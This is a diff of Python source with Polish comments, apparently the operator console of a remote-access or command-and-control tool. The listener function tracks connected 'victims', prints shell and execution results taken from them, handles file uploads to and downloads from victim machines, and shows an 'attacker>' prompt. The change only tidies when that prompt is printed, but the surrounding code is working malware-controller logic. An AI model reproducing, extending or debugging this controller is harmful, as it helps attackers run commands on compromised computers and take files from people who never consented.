@@ -76,6 +76,7 @@ def listener_thread(ws):
                 continue
 
             msg_type = data.get("type", "")
+            printed = False  # czy wyświetliliśmy coś na ekranie
 
             if msg_type == "victims_list":
                 victims = data.get("victims", [])
@@ -85,18 +86,21 @@ def listener_thread(ws):
                         print(f"        • {v}")
                 else:
                     print("\n  [📋] Brak podłączonych victimów")
+                printed = True
 
             elif msg_type == "victim_connected":
                 vid = data.get('id', '?')
                 if vid not in known_victims:
                     known_victims.add(vid)
                     print(f"\n  [+] Victim podłączony: {vid}")
+                    printed = True
                 # Jeśli już znany — cicho (debounce reconnect spamu)
 
             elif msg_type == "victim_disconnected":
                 vid = data.get('id', '?')
                 known_victims.discard(vid)
                 print(f"\n  [-] Victim rozłączony: {vid}")
+                printed = True
 
             elif msg_type == "shell_result":
                 print(f"\n  [💻] Wynik ({data.get('from', '?')}):")
@@ -105,20 +109,25 @@ def listener_thread(ws):
                 for line in data.get("output", "").split("\n"):
                     print(f"  {line}")
                 print("  " + "-" * 40)
+                printed = True
 
             elif msg_type == "upload_done":
                 print(f"\n  [✓] Plik zapisany na victimie: {data.get('filepath')}")
+                printed = True
 
             elif msg_type == "upload_ready":
                 print(f"\n  [⏳] Victim gotowy na odbiór: {data.get('filename')}")
+                printed = True
 
             elif msg_type == "file_incoming":
                 expecting_file = True
                 print(f"\n  [↓] Plik przychodzi od {data.get('from')} ({data.get('size')} B)...")
+                printed = True
 
             elif msg_type == "download_start":
                 expecting_file = True
                 print(f"\n  [↓] Victim wysyła plik: {data.get('filepath')} ({data.get('size')} B)")
+                printed = True
 
             elif msg_type == "execute_result":
                 print(f"\n  [▶] Wynik wykonania ({data.get('from', '?')}):")
@@ -127,6 +136,7 @@ def listener_thread(ws):
                 for line in data.get("output", "").split("\n"):
                     print(f"  {line}")
                 print("  " + "-" * 40)
+                printed = True
 
             elif msg_type == "terminal_output":
                 # Tryb terminala — drukuj output bez promptu
@@ -150,14 +160,19 @@ def listener_thread(ws):
                 if vid not in known_victims:
                     known_victims.add(vid)
                     print(f"\n  [ℹ] Victim info: {data}")
+                    printed = True
+                # Jeśli już znany — cicho
 
             elif msg_type == "error":
                 print(f"\n  [❌] Błąd: {data.get('msg')}")
+                printed = True
 
             else:
                 print(f"\n  [?] {data}")
+                printed = True
 
-            if not terminal_mode:
+            # Prompt tylko jeśli faktycznie coś wyświetliliśmy
+            if printed and not terminal_mode:
                 print("attacker> ", end="", flush=True)
 
         except WebSocketConnectionClosedException:
